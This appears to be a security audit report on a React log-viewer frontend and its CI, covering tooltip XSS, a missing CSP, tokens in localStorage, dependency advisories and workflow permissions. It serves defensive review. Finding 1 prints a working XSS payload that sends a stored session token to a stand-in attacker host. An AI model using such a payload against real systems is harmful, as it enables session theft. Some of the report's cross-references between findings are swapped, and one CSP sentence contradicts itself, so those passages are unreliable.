# Frontend Web Security & Supply Chain — Audit Lens 08

Scope: `frontend/` (React 19 + Vite + TypeScript), `backend/go.mod`, `.github/workflows/**`.
Method: read-only (grep/read, `bun audit`, `bun outdated`). No installs, no cluster commands run.

---

## Finding 1 — Stored/reflected DOM XSS via unescaped log-derived values in every chart tooltip formatter

**Severity: Critical**

**Files:**
- `frontend/src/hooks/useHistogramOption.ts:191-228` (`tooltipLine`, `tooltipFormatter`)
- `frontend/src/components/charts/BarChart.tsx:23-28,55-60` (`Datum.label` from `row[...]`, tooltip formatter)
- `frontend/src/components/charts/DonutChart.tsx:46-51`
- `frontend/src/components/charts/HeatmapChart.tsx:68-77`
- `frontend/src/components/charts/ScatterChart.tsx:72-82`
- `frontend/src/components/charts/WorldMapChart.tsx:187-192,304-308`
- `frontend/src/components/TimeSeriesChart.tsx:126-135`
- `frontend/src/utils/histogramData.ts:86,96,106` (`groupField`/`group` sourced verbatim from a `TableResult` column value)
- `backend/internal/query/histogram.go:809-841` (`timechartBinRecord` groups by an arbitrary `chunk.Attributes` field chosen in the query, e.g. `| timechart by <field>`)

**Attacker scenario:**
Every ECharts tooltip in the app is built by hand-assembling an HTML string and handing it to `tooltip.formatter`. ECharts renders that string via `innerHTML` into the tooltip DOM node (this is the library's documented default; there is no `renderMode: 'richText'` opt-in anywhere in this codebase — confirmed via `grep` across `frontend/src/components/charts/`). None of the interpolated values are HTML-escaped:

```ts
// useHistogramOption.ts:191-198
const tooltipLine = (color: string, label: string, count: number, isBold: boolean): string => {
  ...
  return `${dot}<span style="${style}">${label}</span> <span style="${valueStyle}">${count.toLocaleString()}</span>`;
};
```

`label` here is a **group-by key** — for the sidebar histogram it's fixed (`"level"`), but for the `| timechart by <field>` pipeline path (`tableResultToHistogramData` in `histogramData.ts:64-134`) the group column can be *any* field the query selects, and its value is the raw string from a `TableResult` row (`histogramData.ts:96`: `const group = groupIdx !== -1 ? row.values[groupIdx]! : ""`). That value ultimately comes from `chunk.Attributes` on an ingested record (`backend/internal/query/histogram.go:809` `timechartBinRecord`) — i.e. **attacker-controlled log content** (a syslog message, an HTTP header turned into an attribute, a JSON log field, etc.).

The same pattern repeats in every other chart: `BarChart`/`DonutChart`/`HeatmapChart`/`ScatterChart`/`WorldMapChart` all take `columns`/`rows` from a pipeline `TableResult` (wired in `frontend/src/components/PipelineResults.tsx:147-182`) and interpolate `row[...]` values (category names, series names, point labels) directly into template-literal HTML tooltip strings with no escaping.

Concrete path: an attacker sends a log line whose attribute value is `<img src=x onerror=fetch('https://evil/x?t='+localStorage.getItem('gastrolog_token'))>`. An operator later runs `... | stats count by that_field` or `... | timechart by that_field` and views the resulting chart. Hovering (or in some ECharts configurations, the initial render/`trigger: 'axis'` auto-tooltip on brush/zoom) injects that HTML into the DOM and executes it. Because the JWT and refresh token are stored in `localStorage` (see Finding 2), this is a direct path to full session/account takeover, not just DOM defacement — the `onerror` handler executes inline, which does not require any CSP-execution allowance since it's not a `<script>` tag and the app sets no CSP header at all (Finding 3 makes this worse, not better).

This is **not** a single mistake — it is the systemic pattern used by every chart component in `frontend/src/components/charts/` plus the histogram tooltip.

**Remediation:**
1. Stop hand-building HTML strings for tooltips. Either:
   - HTML-escape every interpolated value (a small `escapeHtml()` helper covering `& < > " '`) before insertion, or
   - Switch ECharts tooltips to `renderMode: 'richText'`/DOM-node tooltips where content is set via `textContent`, not `innerHTML`.
2. Add a project-wide lint rule or code-review checklist item: no template literal containing `<` may be assigned to an ECharts `formatter` without going through the escape helper.
3. Add the same scrutiny to the backend if any other RPC surface plans to accept attribute-driven grouping (there was no `dangerouslySetInnerHTML`-shaped issue found on the record-list path — `LogEntry.tsx` and `DetailPanel.tsx` render spans through JSX text children, which React escapes automatically. This bug is isolated to the ECharts tooltip formatters).

---

## Finding 2 — No Content-Security-Policy header

**Severity: Medium** (compounding factor for Finding 1)

**File:** `backend/internal/server/headers.go:5-14`

`securityHeadersMiddleware` sets `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, and `Permissions-Policy`, but never sets `Content-Security-Policy`. There is no CSP anywhere else in the backend (`grep -rn "Content-Security-Policy" backend` returned nothing) and no `<meta http-equiv="Content-Security-Policy">` in `frontend/index.html`.

**Attacker scenario:** With no CSP, any injected HTML (e.g. Finding 1) gets full run of inline event handlers, inline styles, and (if a future bug allows a literal `<script>`-adjacent vector, e.g. `javascript:` URI or attribute injection) arbitrary script execution with no browser-side backstop. A CSP with `script-src 'self'`, no `'unsafe-inline'`, and a restrictive `default-src` would not have stopped the `onerror=` vector in Finding 1 outright (inline event-handler attributes are blocked by CSP without `'unsafe-inline'` for `script-src` — so a correct CSP actually *would* have blocked it), making this a real missing defense-in-depth layer, not just paperwork.

**Remediation:** Add a CSP to `securityHeadersMiddleware`, e.g. `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'`. Tune `style-src` if truly needed (the app uses Tailwind classes plus some inline `style={{...}}` React props — those are fine under CSP because React sets style via the CSSOM property setter, not `<style>`/`style=` HTML attribute text, so `'unsafe-inline'` for styles is likely avoidable too, but verify against Mermaid's SVG output which may use inline `style` attributes in generated markup).

---

## Finding 3 — JWT and refresh token stored in `localStorage`, readable by any script

**Severity: High** (amplifier, not independently exploitable without an injection point — but Finding 1 provides one)

**File:** `frontend/src/api/client.ts:16-73`

```ts
const TOKEN_KEY = "gastrolog_token";
const REFRESH_TOKEN_KEY = "gastrolog_refresh_token";
let currentToken: string | null = localStorage.getItem(TOKEN_KEY);
...
export function setToken(token: string | null) {
  currentToken = token;
  if (token) {
    localStorage.setItem(TOKEN_KEY, token);
    ...
```

Both the short-lived access JWT and the longer-lived refresh token are persisted in `localStorage`. This is a standard SPA pattern (needed here because the Connect-RPC transport attaches `Authorization: Bearer <token>` per request rather than relying on cookies — `client.ts:76-81`), but it means **any successful XSS reads both tokens directly via `localStorage.getItem`**, with no `httpOnly` cookie boundary to fall back on. Given Finding 1 is a real, verified script-execution primitive, this converts "DOM XSS in a chart tooltip" into "full account takeover including refresh-token-based persistence past token expiry."

**Remediation:** This is a known architectural tradeoff (cookie-based auth would require CSRF protection and doesn't compose as cleanly with a Bearer-token Connect-RPC transport); flagging it here as context for Finding 1's severity rather than demanding a redesign. If the team wants to reduce blast radius independent of fixing the XSS: consider an `httpOnly` cookie for the refresh token specifically (used only by a same-origin refresh endpoint, never read from JS) while keeping the short-lived access token in memory/localStorage — this at least prevents long-lived persistence after a one-shot XSS.

---

## Finding 4 — `react-markdown` URL sanitization disabled (`identityUrlTransform`)

**Severity: Low** (no current attacker-reachable path, but removes a safety net)

**File:** `frontend/src/components/HelpDialog.tsx:14,436`

```ts
const identityUrlTransform = (url: string) => url;
...
<Markdown remarkPlugins={remarkGfmPlugin} components={components} urlTransform={identityUrlTransform}>
```

`react-markdown` v10 sanitizes `href`/`src` URLs by default (`defaultUrlTransform` strips `javascript:`/`data:`/etc. protocols on links and images) unless overridden. This override reduces it to a no-op, so a `javascript:` URI in the markdown source would be rendered verbatim into an `<a href>`.

**Verified:** all content passed to this `<Markdown>` component is bundled at build time via `?raw` imports from `frontend/src/help/*.md` (confirmed in `frontend/src/help/topics.ts:1-30` — every topic's `load` is a static `import('./*.md?raw')`). There is no runtime/user-supplied markdown source anywhere in the app (`grep -rln "react-markdown|ReactMarkdown" frontend/src` only turns up `HelpDialog.tsx`, `Mermaid.tsx`, and the `about.md` content file itself). So today this is dead risk — the "attacker" would have to be a committer to the repo.

**Remediation:** Low priority given the current trust boundary, but cheap to fix and removes a footgun for whoever adds a second, less-trusted Markdown source later (e.g. rendering a user-authored "saved query description" as Markdown in the future). Either drop the `urlTransform` prop entirely (restores the default sanitizer) or replace `identityUrlTransform` with one that only special-cases the `help:`/`settings:` pseudo-schemes already handled in `helpMarkdownComponents.tsx:118-157` and otherwise delegates to the default transform.

---

## Finding 5 — `mermaid` and `echarts` runtime dependencies carry known moderate/high vulnerabilities

**Severity: Medium**

**File:** `frontend/package.json:52,56`, confirmed via `bun audit` (see below)

`bun audit` (run read-only, no `bun audit fix`) reports **70 vulnerabilities (1 critical, 27 high, 36 moderate, 6 low)** across the full dependency graph. Most are in **devDependencies only** (`eslint`, `vite`, `rollup`, `postcss`, `happy-dom`, `@babel/core`, `nanoid`, `picomatch`, `minimatch`, `ajv`, `brace-expansion`, `flatted`, `ws`) — these are build/test tooling, not shipped to the browser bundle, so their exploitability against an end user is effectively nil (a compromised dev machine or malicious CI runner is the realistic threat model, not a remote attacker of the deployed app).

Runtime (shipped-to-browser) packages with findings:
- **`mermaid@11.12.2`** (direct dep, current is 11.16.1): moderate CSS/HTML injection in `classDef`/diagram config sanitization (GHSA-ghcm-xqfw-q4vr, GHSA-xcj9-5m2h-648r, GHSA-87f9-hvmw-gh4p, GHSA-6x64-9x62-f2gx), moderate prototype pollution in architecture diagrams (GHSA-3rrr-jr9j-h3q3), low config-API prototype pollution (GHSA-c4c3-pg64-4m4v), plus DoS advisories (Gantt/XY/radar infinite loops). Exploitability here is low **in this app specifically** because Mermaid only ever renders static, build-time-bundled help-doc content (`frontend/src/components/helpMarkdownComponents.tsx:87-90`, sourced from `frontend/src/help/*.md`) — not attacker/user-supplied diagram source — but it is still a stale dependency worth bumping to 11.16.1+, especially since Mermaid's own transitive `dompurify@3.3.1` has a long list of sanitizer-bypass advisories (GHSA-hpcv-96wg-7vj8 and ~15 others) that matter a great deal *if* Mermaid content ever becomes less trusted later.
- **`echarts@6.0.0`** (direct dep, current is 6.1.0): moderate XSS (GHSA-fgmj-fm8m-jvvx), fixed in 6.1.0. This is directly relevant given Finding 1 — an upstream ECharts XSS fix plus this app's own tooltip-escaping fix should both land together.
- **`@tanstack/react-router`**'s transitive `seroval@1.5.0`: **critical** — type confusion in `seroval.fromJSON()` deserialization invoking attacker-controlled methods (GHSA-mv8w-475r-vwqw). Not independently verified as reachable in this app (this is a client-only SPA with no server-side loader streaming that would deserialize attacker-supplied `seroval` payloads observed in the code read for this audit), but it ships in the production bundle and the fix is a router bump — recommend upgrading `@tanstack/react-router` regardless of confirmed reachability, since "critical severity, present in the shipped bundle, low upgrade cost" doesn't warrant leaving it pinned to research reachability further.
- **`mermaid`'s transitive `uuid@11.1.0`**: moderate missing buffer bounds check in v3/v5/v6 (GHSA-w5hq-g745-h8pq) — Mermaid's own usage pattern wasn't traced; low priority.

**Remediation:** `bun update mermaid echarts` (both have drop-in minor bumps per `bun outdated`: mermaid → 11.16.1, echarts → 6.1.0) and `bun update @tanstack/react-router @tanstack/react-query` (1.170.30 / 5.101.4 available) to pick up the `seroval` fix transitively. Re-run `bun audit` after to confirm the runtime-dependency count drops. The devDependency-only findings (vite/rollup/postcss/eslint chain) are lower priority but worth a periodic `bun audit fix` pass since Vite in particular has dev-server-only high-severity path-traversal/file-read advisories relevant if `vite dev` is ever exposed beyond localhost.

---

## Finding 6 — CI: no explicit `permissions:` block on `ci.yml` / `race.yml`

**Severity: Low**

**Files:** `.github/workflows/ci.yml:1-38`, `.github/workflows/race.yml:1-37`

Neither workflow declares a `permissions:` block, so the `GITHUB_TOKEN` used in the job takes whatever the repository/org default is (which may be broader than `contents: read`, e.g. if the default was ever left at "read and write" in repo settings). Both workflows only run `go build`/`go test` and don't need any token permissions at all.

**Verified as low-risk in practice:** both trigger on `push: [main]` and `pull_request: [main]` (not `pull_request_target`), so a fork PR still runs with a **read-only, secret-less** token per GitHub's default fork-PR sandboxing — there is no privilege-escalation path here today. This is a hardening/least-privilege recommendation, not an active exploit.

**Remediation:** Add `permissions: contents: read` at the top of `ci.yml` and `race.yml` for defense-in-depth (protects against a future change to the workflow accidentally needing broader scope, or an org-level default permission change).

---

## Checked and sound

- **No `dangerouslySetInnerHTML`/`innerHTML` on any attacker-controlled data path.** The only `dangerouslySetInnerHTML` in the codebase is `frontend/src/components/Mermaid.tsx:160`, and its input is Mermaid's own rendered SVG output from build-time-bundled help-doc source — not log/record content.
- **Log record rendering (`LogEntry.tsx`, `DetailPanel.tsx`) is XSS-safe.** Both render syntax-highlighted spans as JSX text children (`{part.text}`), which React escapes automatically; no raw HTML path exists there.
- **URL auto-linking in log text is scheme-restricted.** `frontend/src/syntax.ts:311`: `RE_URL = /\bhttps?:\/\/[^\s"'<>]+/g` only matches `http(s)://`, so a `javascript:` URI embedded in log content cannot become a clickable `<a href>` via this path.
- **Search-bar/route query params (`q`, `help`, `settings`, `inspector`) are cast to plain strings and never rendered as HTML** (`frontend/src/routes/search.tsx:8-13`, `frontend/src/routes/follow.tsx:8-13`) — no reflected-XSS or open-redirect path found through the router's `validateSearch`.
- **Token lifecycle (refresh, expiry, logout) is coherent.** `frontend/src/api/client.ts` proactively refreshes before expiry, retries once on `Unauthenticated`, and clears both tokens + redirects on failure; `frontend/src/api/hooks/useAuth.ts:90-104` (`useLogout`) clears both `localStorage` keys and the React Query cache on explicit logout. No stale-token or fail-open path was found.
- **CI secrets exposure and fork-PR privilege:** `publish.yml`/`release.yml` (the workflows with real secrets: `secrets.GITHUB_TOKEN`, `secrets.HOMEBREW_TAP_TOKEN`) trigger only on `push: tags` and `release: published` — both require push/maintainer access, never on `pull_request`/`pull_request_target`. No fork-PR-triggered privileged job exists.
- **Third-party GitHub Actions are all pinned to a version tag** (`actions/checkout@v6`, `actions/setup-go@v6`, `oven-sh/setup-bun@v2`, `actions/upload-artifact@v4`, `actions/download-artifact@v4`, `softprops/action-gh-release@v1`, `docker/setup-qemu-action@v3`, `docker/setup-buildx-action@v3`, `docker/login-action@v3`, `docker/build-push-action@v6`) — none use `@main`/`@master`/a branch ref. (SHA-pinning would be stricter still, but no unpinned/floating-branch action was found.)
- **No vendored/committed binaries or blobs.** `git ls-files` search for common binary extensions found nothing beyond `docs/screenshot.png` (a legitimate doc asset); the largest tracked file is the append-only `.dogcats/issues.jsonl` tracker.
- **`backend/go.mod` has no `replace` directives and no non-canonical (non-`github.com`/`golang.org`/`google.golang.org`/`cloud.google.com`) module sources.** Full Go CVE enumeration is explicitly out of scope for this lens (covered by a separate `govulncheck` pass per the task brief).
- **No `eval`, `new Function`, or `postMessage`/`message`-event handlers** anywhere in `frontend/src` (verified via grep).
